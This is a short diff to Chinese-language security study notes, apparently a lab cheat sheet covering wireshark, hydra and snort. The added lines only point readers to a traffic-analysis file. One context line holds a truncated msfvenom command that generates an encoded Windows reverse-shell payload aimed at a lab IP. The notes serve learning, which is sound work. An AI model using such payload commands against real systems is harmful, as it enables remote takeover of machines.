@@ -193,6 +193,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.239.167 LPORT=4443 -e x86/shik
 
 ### wireshark
 
+左转去流量分析.md查看
+
 ### hydra
 
 >HTBA关于hydra的栗子：  
@@ -323,6 +325,7 @@ sudo snort -c FILEPATH -T
 -r	读取选项，读取Snort中转储的日志。
 -n	指定将处理/读取的数据包数量。 Snort 在读取指定数量的数据包后将停止。
 
+剩下的左转去流量分析查看
 
 ### powershell
 
